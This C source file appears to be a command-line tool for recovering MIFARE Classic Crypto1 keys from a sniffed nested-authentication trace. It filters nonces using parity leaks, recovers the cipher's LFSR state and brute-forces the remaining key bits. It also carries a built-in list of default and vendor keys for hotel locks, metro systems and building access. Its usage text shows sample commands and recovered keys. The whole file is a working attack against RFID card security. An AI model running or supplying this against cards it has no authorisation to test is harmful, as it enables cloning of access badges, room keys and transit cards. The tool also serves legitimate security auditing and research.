#define __STDC_FORMAT_MACROS

#include <inttypes.h>
#include <stdio.h>
#include <stdbool.h>
#include <string.h>
#include <pthread.h>
#include <stdlib.h>
#include <unistd.h>
#include <ctype.h>
#include "crapto1/crapto1.h"
#include "protocol.h"
#include "iso14443crc.h"
#include "util_posix.h"

#define AEND  "\x1b[0m"
#define _RED_(s) "\x1b[31m" s AEND
#define _GREEN_(s) "\x1b[32m" s AEND
#define _YELLOW_(s) "\x1b[33m" s AEND
#define _CYAN_(s) "\x1b[36m" s AEND

#define odd_parity(i) (( (i) ^ (i)>>1 ^ (i)>>2 ^ (i)>>3 ^ (i)>>4 ^ (i)>>5 ^ (i)>>6 ^ (i)>>7 ^ 1) & 0x01)
#define ARRAYLEN(x) (sizeof(x) / sizeof((x)[0]))

// a global mutex to prevent interlaced printing from different threads
pthread_mutex_t print_lock;

//--------------------- define options here
uint32_t uid = 0;     // serial number
uint32_t nt_enc = 0;  // Encrypted tag nonce
uint32_t nr_enc = 0;  // encrypted reader challenge
uint32_t ar_enc = 0;  // encrypted reader response
uint32_t at_enc = 0;  // encrypted tag response
uint32_t cmd_enc = 0; // next encrypted command to sector

uint32_t nt_par_err = 0;
uint32_t ar_par_err = 0;
uint32_t at_par_err = 0;

typedef struct thread_args {
    uint16_t xored;
    int thread;
    int idx;
    bool ev1;
} targs;

#define ENC_LEN  (200)
typedef struct thread_key_args {
    int thread;
    int idx;
    uint32_t uid;
    uint32_t part_key;
    uint32_t nt_enc;
    uint32_t nr_enc;
    uint16_t enc_len;
    uint8_t enc[ENC_LEN];  // next encrypted command + a full read/write
} targs_key;

//------------------------------------------------------------------

uint8_t cmds[8][2] = {
    {ISO14443A_CMD_READBLOCK, 18},
    {ISO14443A_CMD_WRITEBLOCK, 18},
    {MIFARE_AUTH_KEYA, 0},
    {MIFARE_AUTH_KEYB, 0},
    {MIFARE_CMD_INC, 6},
    {MIFARE_CMD_DEC, 6},
    {MIFARE_CMD_RESTORE, 6},
    {MIFARE_CMD_TRANSFER, 0}
};

static const uint64_t g_mifare_default_keys[] = {
    0xffffffffffff, // Default key (first key used by program if no user defined key)
    0xa0a1a2a3a4a5, // NFCForum MAD key
    0xd3f7d3f7d3f7, // NDEF public key
    0x4b791bea7bcc, // MFC EV1 Signature 17 B
    0x5C8FF9990DA2, // MFC EV1 Signature 16 A
    0xD01AFEEB890A, // MFC EV1 Signature 16 B
    0x75CCB59C9BED, // MFC EV1 Signature 17 A
    0xfc00018778f7, // Public Transport
    0x6471a5ef2d1a, // SimonsVoss
    0x4E3552426B32, // ID06
    0x6A1987C40A21, // Salto
    0xef1232ab18a0, // Schlage
    0x3B7E4FD575AD, //
    0xb7bf0c13066e, // Gallagher
    0x135b88a94b8b, // Saflok
    0x2A2C13CC242A, // Dorma Kaba
    0x5a7a52d5e20d, // Bosch
    0x314B49474956, // VIGIK1 A
    0x564c505f4d41, // VIGIK1 B
    0x021209197591, // BTCINO
    0x484558414354, // Intratone
    0xEC0A9B1A9E06, // Vingcard
    0x66b31e64ca4b, // Vingcard
    0x97F5DA640B18, // Bangkok metro key
    0xA8844B0BCA06, // Metro Valencia key
    0xE4410EF8ED2D, // Armenian metro
    0x857464D3AAD1, // HTC Eindhoven key
    0x08B386463229, // troika
    0xe00000000000, // icopy
    0x199404281970, // NSP A
    0x199404281998, // NSP B
    0x6A1987C40A21, // SALTO
    0x7F33625BC129, // SALTO
    0x484944204953, // HID
    0x204752454154, // HID
    0x3B7E4FD575AD, // HID
    0x11496F97752A, // HID
    0x3E65E4FB65B3, // Gym
    0x000000000000, // Blank key
    0xb0b1b2b3b4b5,
    0xaabbccddeeff,
    0x1a2b3c4d5e6f,
    0x123456789abc,
    0x010203040506,
    0x123456abcdef,
    0xabcdef123456,
    0x4d3a99c351dd,
    0x1a982c7e459a,
    0x714c5c886e97,
    0x587ee5f9350f,
    0xa0478cc39091,
    0x533cb6c723f6,
    0x8fd0a4f256e9,
    0x0000014b5c31,
    0xb578f38a5c61,
    0x96a301bce267,
};


//static int global_counter = 0;
static int global_found = 0;
static int global_found_candidate = 0;
static uint64_t global_candidate_key = 0;
static int thread_count = 2;

static int param_getptr(const char *line, int *bg, int *en, int paramnum) {
    int i;
    int len = strlen(line);

    *bg = 0;
    *en = 0;

    // skip spaces
    while (line[*bg] == ' ' || line[*bg] == '\t')(*bg)++;
    if (*bg >= len) {
        return 1;
    }

    for (i = 0; i < paramnum; i++) {
        while (line[*bg] != ' ' && line[*bg] != '\t' && line[*bg] != '\0')(*bg)++;
        while (line[*bg] == ' ' || line[*bg] == '\t')(*bg)++;

        if (line[*bg] == '\0') return 1;
    }

    *en = *bg;
    while (line[*en] != ' ' && line[*en] != '\t' && line[*en] != '\0')(*en)++;

    (*en)--;

    return 0;
}

static int param_gethex_to_eol(const char *line, int paramnum, uint8_t *data, int maxdatalen, int *datalen) {
    int bg, en;
    uint32_t temp;
    char buf[5] = {0};

    if (param_getptr(line, &bg, &en, paramnum)) return 1;

    *datalen = 0;

    int indx = bg;
    while (line[indx]) {
        if (line[indx] == '\t' || line[indx] == ' ') {
            indx++;
            continue;
        }

        if (isxdigit(line[indx])) {
            buf[strlen(buf) + 1] = 0x00;
            buf[strlen(buf)] = line[indx];
        } else {
            // if we have symbols other than spaces and hex
            return 1;
        }

        if (*datalen >= maxdatalen) {
            // if we don't have space in buffer and have symbols to translate
            return 2;
        }

        if (strlen(buf) >= 2) {
            sscanf(buf, "%x", &temp);
            data[*datalen] = (uint8_t)(temp & 0xff);
            *buf = 0;
            (*datalen)++;
        }

        indx++;
    }

    if (strlen(buf) > 0)
        //error when not completed hex bytes
        return 3;

    return 0;
}

static void hex_to_buffer(const uint8_t *buf, const uint8_t *hex_data, const size_t hex_len, const size_t hex_max_len,
                          const size_t min_str_len, const size_t spaces_between, bool uppercase) {

    if (buf == NULL) return;

    char *tmp_base = (char *)buf;
    char *tmp = tmp_base;
    size_t i;

    size_t max_len = (hex_len > hex_max_len) ? hex_max_len : hex_len;

    for (i = 0; i < max_len; ++i, tmp += 2 + spaces_between) {
        snprintf(tmp, hex_max_len - (tmp - tmp_base), (uppercase) ? "%02X" : "%02x", (unsigned int) hex_data[i]);

        for (size_t j = 0; j < spaces_between; j++)
            snprintf(tmp + 2 + j, hex_max_len - (2 + j + (tmp - tmp_base)), " ");
    }

    i *= (2 + spaces_between);

    size_t mlen = min_str_len > i ? min_str_len : 0;
    if (mlen > hex_max_len)
        mlen = hex_max_len;

    for (; i < mlen; i++, tmp += 1)
        snprintf(tmp, hex_max_len - (tmp - tmp_base), " ");

    // remove last space
    *tmp = '\0';
}

static char *sprint_hex_inrow_ex(const uint8_t *data, const size_t len, const size_t min_str_len) {
    static char buf[100] = {0};
    hex_to_buffer((uint8_t *)buf, data, len, sizeof(buf) - 1, min_str_len, 0, true);
    return buf;
}

static uint16_t parity_from_err(uint32_t data, uint16_t par_err) {

    uint16_t par = 0;
    par |= odd_parity((data >> 24) & 0xFF) ^ ((par_err >> 12) & 1);
    par <<= 4;

    par |= odd_parity((data >> 16) & 0xFF) ^ ((par_err >> 8) & 1);
    par <<= 4;

    par |= odd_parity((data >> 8) & 0xFF) ^ ((par_err >> 4) & 1);
    par <<= 4;

    par |= odd_parity(data & 0xFF) ^ (par_err & 1);
    return par;
}

static uint16_t xored_bits(uint16_t nt_par, uint32_t ntenc, uint16_t ar_par, uint32_t arenc, uint16_t at_par, uint32_t atenc) {

    uint16_t xored = 0;
    uint8_t par;

    //1st (1st nt)
    par = (nt_par >> 12) & 1;
    xored |=  par ^ ((ntenc >> 16) & 1);
    xored <<= 1;

    //2nd (2nd nt)
    par = (nt_par >> 8) & 1;
    xored |= par ^ ((ntenc >> 8) & 1);
    xored <<= 1;

    //3rd (3rd nt)
    par = (nt_par >> 4) & 1;
    xored |= par ^ (ntenc & 1);
    xored <<= 1;

    //4th (1st ar)
    par = (ar_par >> 12) & 1;
    xored |= par ^ ((arenc >> 16) & 1);
    xored <<= 1;

    //5th (2nd ar)
    par = (ar_par >> 8) & 1;
    xored |= par ^ ((arenc >> 8) & 1);
    xored <<= 1;

    //6th (3rd ar)
    par = (ar_par >> 4) & 1;
    xored |= par ^ (arenc & 1);
    xored <<= 1;

    //7th (4th ar)
    par = ar_par & 1;
    xored |= par ^ ((atenc >> 24) & 1);
    xored <<= 1;

    //8th (1st at)
    par = (at_par >> 12) & 1;
    xored |= par ^ ((atenc >> 16) & 1);
    xored <<= 1;

    //9th (2nd at)
    par = (at_par >> 8) & 1;
    xored |= par ^ ((atenc >> 8) & 1);
    xored <<= 1;

    //10th (3rd at)
    par = (at_par >> 4) & 1;
    xored |= par ^ (atenc & 1);

    return xored;
}

static bool candidate_nonce(uint32_t xored, uint32_t nt, bool ev1) {
    uint8_t byte;

    if (!ev1) {
        // 1st (1st nt)
        byte = (nt >> 24) & 0xFF;
        if (odd_parity(byte) ^ ((nt >> 16) & 1) ^ ((xored >> 9) & 1)) {
            return false;
        }

        // 2nd (2nd nt)
        byte = (nt >> 16) & 0xFF;
        if (odd_parity(byte) ^ ((nt >> 8) & 1) ^ ((xored >> 8) & 1)) {
            return false;
        }
    }

    // 3rd (3rd nt)
    byte = (nt >> 8) & 0xFF;
    if (odd_parity(byte) ^ (nt & 1) ^ ((xored >> 7) & 1)) {
        return false;
    }

    uint32_t ar = prng_successor(nt, 64);

    // 4th (1st ar)
    byte = (ar >> 24) & 0xFF;
    if (odd_parity(byte) ^ ((ar >> 16) & 1) ^ ((xored >> 6) & 1)) {
        return false;
    }

    // 5th (2nd ar)
    byte = (ar >> 16) & 0x0FF;
    if (odd_parity(byte) ^ ((ar >> 8) & 1) ^ ((xored >> 5) & 1)) {
        return false;
    }

    // 6th (3rd ar)
    byte = (ar >> 8) & 0xFF;
    if (odd_parity(byte) ^ (ar & 1) ^ ((xored >> 4) & 1)) {
        return false;
    }

    uint32_t at = prng_successor(nt, 96);

    // 7th (4th ar)
    byte = ar & 0xFF;
    if (odd_parity(byte) ^ ((at >> 24) & 1) ^ ((xored >> 3) & 1)) {
        return false;
    }

    // 8th (1st at)
    byte = (at >> 24) & 0xFF;
    if (odd_parity(byte) ^ ((at >> 16) & 1) ^ ((xored >> 2) & 1)) {
        return false;
    }

    // 9th (2nd at)
    byte = (at >> 16) & 0xFF;
    if (odd_parity(byte) ^ ((at >> 8) & 1) ^ ((xored >> 1) & 1)) {
        return false;
    }

    // 10th (3rd at)
    byte = (at >> 8) & 0xFF;
    if (odd_parity(byte) ^ (at & 1) ^ (xored & 1)) {
        return false;
    }

    return true;
}

static bool checkValidCmd(uint32_t decrypted) {
    uint8_t cmd = (decrypted >> 24) & 0xFF;
    for (int i = 0; i < 8; ++i) {
        if (cmd == cmds[i][0]) {
            return true;
        }
    }
    return false;
}

static bool checkValidCmdByte(uint8_t *cmd, uint16_t n) {
// if we don't have enough data then this might be a false positive

    if (cmd == NULL) {
        return false;
    }

    for (int i = 0; i < 8; ++i) {
        if (cmd[0] == cmds[i][0]) {

            int res = 0;

            if (n >= 4) {
                res = CheckCrc14443(CRC_14443_A, cmd, 4);
            }

            if (res == 0 && cmds[i][1] > 0 && n >= cmds[i][1]) {
                res = CheckCrc14443(CRC_14443_A, cmd, cmds[i][1]);
            }

            if (res) {
                return true;
            }
        }
    }
    return false;
}

static bool checkCRC(uint32_t decrypted) {
    uint8_t data[] = {
        (decrypted >> 24) & 0xFF,
        (decrypted >> 16) & 0xFF,
        (decrypted >> 8)  & 0xFF,
        decrypted & 0xFF
    };
    return CheckCrc14443(CRC_14443_A, data, sizeof(data));
}

static void *check_default_keys(void *arguments) {
    struct thread_key_args *args = (struct thread_key_args *) arguments;
    uint8_t local_enc[args->enc_len];
    memcpy(local_enc, args->enc, args->enc_len);

    for (uint8_t i = 0; i < ARRAYLEN(g_mifare_default_keys); i++) {

        uint64_t key = g_mifare_default_keys[i];

        // Init cipher with key
        struct Crypto1State *pcs = crypto1_create(key);

        // NESTED decrypt nt with help of new key
        crypto1_word(pcs, args->nt_enc ^ args->uid, 1);
        crypto1_word(pcs, args->nr_enc, 1);
        crypto1_word(pcs, 0, 0);
        crypto1_word(pcs, 0, 0);

        // decrypt bytes
        uint8_t dec[args->enc_len];
        for (int j = 0; j < args->enc_len; j++) {
            dec[j] = crypto1_byte(pcs, 0x00, 0) ^ local_enc[j];
        }
        crypto1_destroy(pcs);

        // check if cmd exists
        bool res = checkValidCmdByte(dec, args->enc_len);
        if (args->enc_len > 4) {
            res |= checkValidCmdByte(dec + 4,  args->enc_len - 4);
        }

        if (res == false) {
            continue;
        }

        __sync_fetch_and_add(&global_found, 1);

        pthread_mutex_lock(&print_lock);
        printf("\nFound a default key!\n");
        printf("enc:  %s\n", sprint_hex_inrow_ex(local_enc, args->enc_len, 0));
        printf("dec:  %s\n", sprint_hex_inrow_ex(dec, args->enc_len, 0));
        printf("\nValid Key found [ " _GREEN_("%012" PRIx64) " ]\n\n", key);
        pthread_mutex_unlock(&print_lock);
        break;
    }
    free(args);
    return NULL;
}

static void *brute_thread(void *arguments) {

    struct thread_args *args = (struct thread_args *) arguments;

    struct Crypto1State *revstate = NULL;
    uint64_t key;     // recovered key candidate
    uint32_t ks2;     // keystream used to encrypt reader response
    uint32_t ks3;     // keystream used to encrypt tag response
    uint32_t ks4;     // keystream used to encrypt next command
    uint32_t nt;      // current tag nonce

    uint32_t p64 = 0;
    // TC == 4  (
    // threads calls 0 ev1 == false
    // threads calls 0,1,2  ev1 == true
    for (uint32_t count = args->idx; count <= 0xFFFF; count += thread_count) {

        if (__atomic_load_n(&global_found, __ATOMIC_ACQUIRE) == 1) {
            break;
        }

        nt = count << 16 | prng_successor(count, 16);

        if (candidate_nonce(args->xored, nt, args->ev1) == false) {
            continue;
        }

        p64 = prng_successor(nt, 64);
        ks2 = ar_enc ^ p64;
        ks3 = at_enc ^ prng_successor(p64, 32);
        revstate = lfsr_recovery64(ks2, ks3);
        ks4 = crypto1_word(revstate, 0, 0);

        if (ks4 == 0) {
            free(revstate);
            continue;
        }

        // lock this section to avoid interlacing prints from different threats
        pthread_mutex_lock(&print_lock);
        if (args->ev1) {
            printf("\n---> " _YELLOW_(" Possible key candidate")"  <---\n");
        }

#if 0
        printf("thread #%d idx %d %s\n", args->thread, args->idx, (args->ev1) ? "(Ev1)" : "");
        printf("current nt(%08x)  ar_enc(%08x)  at_enc(%08x)\n", nt, ar_enc, at_enc);
        printf("ks2:%08x\n", ks2);
        printf("ks3:%08x\n", ks3);
        printf("ks4:%08x\n", ks4);
#endif
        if (cmd_enc) {
            uint32_t decrypted = ks4 ^ cmd_enc;
            printf("CMD enc( %08x )\n", cmd_enc);
            printf("    dec( %08x )    ", decrypted);

            // check if cmd exists
            uint8_t isOK = checkValidCmd(decrypted);
            if (isOK == false) {
                printf(_RED_("<-- not a valid cmd\n"));
                pthread_mutex_unlock(&print_lock);
                free(revstate);
                continue;
            }

            // Add a crc-check.
            isOK = checkCRC(decrypted);
            if (isOK == false) {
                printf(_RED_("<-- not a valid crc\n"));
                pthread_mutex_unlock(&print_lock);
                free(revstate);
                continue;
            }

            printf("<-- " _GREEN_("valid cmd") "\n");
        }

        lfsr_rollback_word(revstate, 0, 0);
        lfsr_rollback_word(revstate, 0, 0);
        lfsr_rollback_word(revstate, 0, 0);
        lfsr_rollback_word(revstate, nr_enc, 1);
        lfsr_rollback_word(revstate, uid ^ nt, 0);
        crypto1_get_lfsr(revstate, &key);
        free(revstate);

        if (args->ev1) {
            // if it was EV1,  we know for sure xxxAAAAAAAA recovery
            printf("\nKey candidate [ " _YELLOW_("....%08" PRIx64)" ]\n\n", key & 0xFFFFFFFF);
            __sync_fetch_and_add(&global_found_candidate, 1);
        } else {
            printf("\nKey candidate [ " _GREEN_("....%08" PRIx64) " ]", key & 0xFFFFFFFF);
            printf("\nKey candidate [ " _GREEN_("%12" PRIx64) " ]\n\n", key);
            __sync_fetch_and_add(&global_found, 1);
        }
        // release lock
        pthread_mutex_unlock(&print_lock);
        __sync_fetch_and_add(&global_candidate_key, key);
        break;
    }
    free(args);
    return NULL;
}

// Bruteforce the upper 16 bits of the key
static void *brute_key_thread(void *arguments) {

    struct thread_key_args *args = (struct thread_key_args *) arguments;
    uint8_t local_enc[args->enc_len];
    memcpy(local_enc, args->enc, args->enc_len);

    for (uint64_t count = args->idx; count <= 0xFFFF; count += thread_count) {

        uint64_t key = args->part_key | (count << 32);

        // Init cipher with key
        struct Crypto1State *pcs = crypto1_create(key);

        // NESTED decrypt nt with help of new key
        crypto1_word(pcs, args->nt_enc ^ args->uid, 1);
        crypto1_word(pcs, args->nr_enc, 1);
        crypto1_word(pcs, 0, 0);
        crypto1_word(pcs, 0, 0);

        // decrypt 22 bytes
        uint8_t dec[args->enc_len];
        for (int i = 0; i < args->enc_len; i++) {
            dec[i] = crypto1_byte(pcs, 0x00, 0) ^ local_enc[i];
        }

        crypto1_destroy(pcs);

        // check if cmd exists
        if (checkValidCmdByte(dec, args->enc_len) == false) {
            continue;
        }

        __sync_fetch_and_add(&global_found_candidate, 1);

        // lock this section to avoid interlacing prints from different threats
        pthread_mutex_lock(&print_lock);
        printf("\nenc:  %s\n", sprint_hex_inrow_ex(local_enc, args->enc_len, 0));
        printf("dec:  %s\n", sprint_hex_inrow_ex(dec, args->enc_len, 0));

        if (key == global_candidate_key) {
            printf("\nValid Key found [ " _GREEN_("%012" PRIx64) " ] - " _YELLOW_("matches candidate")  "\n\n", key);
        } else {
            printf("\nValid Key found [ " _GREEN_("%012" PRIx64) " ]\n\n", key);
        }

        pthread_mutex_unlock(&print_lock);
    }
    free(args);
    return NULL;
}

static int usage(void) {
    printf("\n");
    printf("syntax:  mf_nonce_brute <uid> <nt> <nt_par_err> <nr> <ar> <ar_par_err> <at> <at_par_err> [<next_command>]\n\n");
    printf("how to convert trace data to needed input:\n");
    printf("    nt in trace = 8c! 42 e6! 4e!\n");
    printf("             nt = 8c42e64e\n");
    printf("     nt_par_err = 1011\n\n");
    printf("samples:\n");
    printf("\n");
    printf("  ./mf_nonce_brute fa247164 fb47c594 0000 71909d28 0c254817 1000 0dc7cfbd 1110\n");
    printf("\n");
    printf("**** Possible key candidate ****\n");
    printf("Key candidate: [....ffffffff]\n");
    printf("Too few next cmd bytes, skipping phase 2\n");
    printf("\n");
    printf("  ./mf_nonce_brute 96519578 d7e3c6ac 0011 cd311951 9da49e49 0010 2bb22e00 0100 a4f7f398ebdb4e484d1cb2b174b939d18b469f3fa5d9caab\n");
    printf("\n");
    printf("enc:  A4F7F398EBDB4E484D1CB2B174B939D18B469F3FA5D9CAABBFA018EC7E0CC5721DE2E590F64BD0A5B4EFCE71\n");
    printf("dec:  30084A24302F8102F44CA5020500A60881010104763930084A24302F8102F44CA5020500A608810101047639\n");
    printf("Valid Key found: [3b7e4fd575ad]\n\n");
    return 1;
}

int main(int argc, const char *argv[]) {
    printf("\nMifare classic nested auth key recovery\n\n");

    if (argc < 9) return usage();

    sscanf(argv[1], "%x", &uid);
    sscanf(argv[2], "%x", &nt_enc);
    sscanf(argv[3], "%x", &nt_par_err);
    sscanf(argv[4], "%x", &nr_enc);
    sscanf(argv[5], "%x", &ar_enc);
    sscanf(argv[6], "%x", &ar_par_err);
    sscanf(argv[7], "%x", &at_enc);
    sscanf(argv[8], "%x", &at_par_err);

    // next encrypted command + a full read/write
    int enc_len = 0;
    uint8_t enc[ENC_LEN] = {0};
    if (argc > 9) {
        param_gethex_to_eol(argv[9], 0, enc, sizeof(enc), &enc_len);
        cmd_enc = (enc[0] << 24 | enc[1] << 16 | enc[2] << 8 | enc[3]);
    }

    printf("----------- " _CYAN_("information") " ------------------------\n");
    printf("uid.................. %08x\n", uid);
    printf("nt encrypted......... %08x\n", nt_enc);
    printf("nt parity err........ %04x\n", nt_par_err);
    printf("nr encrypted......... %08x\n", nr_enc);
    printf("ar encrypted......... %08x\n", ar_enc);
    printf("ar parity err........ %04x\n", ar_par_err);
    printf("at encrypted......... %08x\n", at_enc);
    printf("at parity err........ %04x\n", at_par_err);

    if (argc > 9) {
        printf("next encrypted cmd... %s\n", sprint_hex_inrow_ex(enc, enc_len, 0));
    }

    uint64_t t1 = msclock();
    uint16_t nt_par = parity_from_err(nt_enc, nt_par_err);
    uint16_t ar_par = parity_from_err(ar_enc, ar_par_err);
    uint16_t at_par = parity_from_err(at_enc, at_par_err);

    // calc (parity XOR corresponding nonce bit encoded with the same keystream bit)
    uint16_t xored = xored_bits(nt_par, nt_enc, ar_par, ar_enc, at_par, at_enc);

#if !defined(_WIN32) || !defined(__WIN32__)
    thread_count = sysconf(_SC_NPROCESSORS_CONF);
    if (thread_count < 2)
        thread_count = 2;
#endif  /* _WIN32 */

    printf("\nBruteforce using " _YELLOW_("%d") " threads\n\n", thread_count);

    pthread_t threads[thread_count];

    // create a mutex to avoid interlacing print commands from our different threads
    pthread_mutex_init(&print_lock, NULL);

    // if we have 4 or more bytes,  look for a default key
    if (enc_len > 3) {
        printf("----------- " _CYAN_("Phase 1 pre-processing") " ------------------------\n");
        printf("Testing default keys using NESTED authentication...\n");
        struct thread_key_args *def = calloc(1, sizeof(struct thread_key_args));
        def->thread = 0;
        def->idx = 0;
        def->uid = uid;
        def->nt_enc = nt_enc;
        def->nr_enc = nr_enc;
        def->enc_len = enc_len;
        memcpy(def->enc, enc, enc_len);
        pthread_create(&threads[0], NULL, check_default_keys, (void *)def);
        pthread_join(threads[0], NULL);
        if (global_found) {
            goto out;
        }
    }

    printf("\n----------- " _CYAN_("Phase 2 examine") " -------------------------------\n");
    printf("Looking for the last bytes of the encrypted tagnonce\n");
    printf("\nTarget old MFC...\n");
    // the rest of available threads to EV1 scenario
    for (int i = 0; i < thread_count; ++i) {
        struct thread_args *a = calloc(1, sizeof(struct thread_args));
        a->xored = xored;
        a->thread = i;
        a->idx = i;
        a->ev1 = false;
        pthread_create(&threads[i], NULL, brute_thread, (void *)a);
    }

    // wait for threads to terminate:
    for (int i = 0; i < thread_count; ++i) {
        pthread_join(threads[i], NULL);
    }

    t1 = msclock() - t1;
    printf("execution time " _YELLOW_("%.2f") " sec\n", (float)t1 / 1000.0);

    if (!global_found && !global_found_candidate) {
        printf("\nTarget MFC Ev1...\n");

        t1 = msclock();
        // the rest of available threads to EV1 scenario
        for (int i = 0; i < thread_count; ++i) {
            struct thread_args *a = calloc(1, sizeof(struct thread_args));
            a->xored = xored;
            a->thread = i;
            a->idx = i;
            a->ev1 = true;
            pthread_create(&threads[i], NULL, brute_thread, (void *)a);
        }

        // wait for threads to terminate:
        for (int i = 0; i < thread_count; ++i) {
            pthread_join(threads[i], NULL);
        }

        t1 = msclock() - t1;
        printf("execution time " _YELLOW_("%.2f") " sec\n", (float)t1 / 1000.0);


        if (!global_found && !global_found_candidate) {
            printf("\nFailed to find a key\n\n");
            goto out;
        }
    }

    if (enc_len < 4) {
        printf("Too few next cmd bytes, skipping phase 3\n\n");
        goto out;
    }

    // reset thread signals
    global_found_candidate = 0;

    printf("\n----------- " _CYAN_("Phase 3 validating") " ----------------------------\n");
    printf("uid.................. %08x\n", uid);
    printf("partial key.......... %08x\n", (uint32_t)(global_candidate_key & 0xFFFFFFFF));
    printf("possible key......... %012" PRIx64 "\n", global_candidate_key);
    printf("nt enc............... %08x\n", nt_enc);
    printf("nr enc............... %08x\n", nr_enc);
    printf("next encrypted cmd... %s\n", sprint_hex_inrow_ex(enc, enc_len, 0));
    printf("\nLooking for the upper 16 bits of the key\n");
    fflush(stdout);

    // threads
    for (int i = 0; i < thread_count; ++i) {
        struct thread_key_args *b = calloc(1, sizeof(struct thread_key_args));
        b->thread = i;
        b->idx = i;
        b->uid = uid;
        b->part_key = (uint32_t)(global_candidate_key & 0xFFFFFFFF);
        b->nt_enc = nt_enc;
        b->nr_enc = nr_enc;
        b->enc_len = enc_len;
        memcpy(b->enc, enc, enc_len);
        pthread_create(&threads[i], NULL, brute_key_thread, (void *)b);
    }

    // wait for threads to terminate:
    for (int i = 0; i < thread_count; ++i) {
        pthread_join(threads[i], NULL);
    }


    if (global_found_candidate > 1) {
        printf("Key recovery ( " _GREEN_("ok") " )\n");
        printf("Found " _GREEN_("%d") " possible keys\n", global_found_candidate);
        printf(_YELLOW_("You need to test them manually, start with the one matching the candidate\n\n"));
    } else if (global_found_candidate == 1) {
        printf("Key recovery ( " _GREEN_("ok") " )\n\n");
    } else {
        printf("Key recovery ( " _RED_("fail") " )\n\n");
    }

out:
    // clean up mutex
    pthread_mutex_destroy(&print_lock);
    return 0;
}
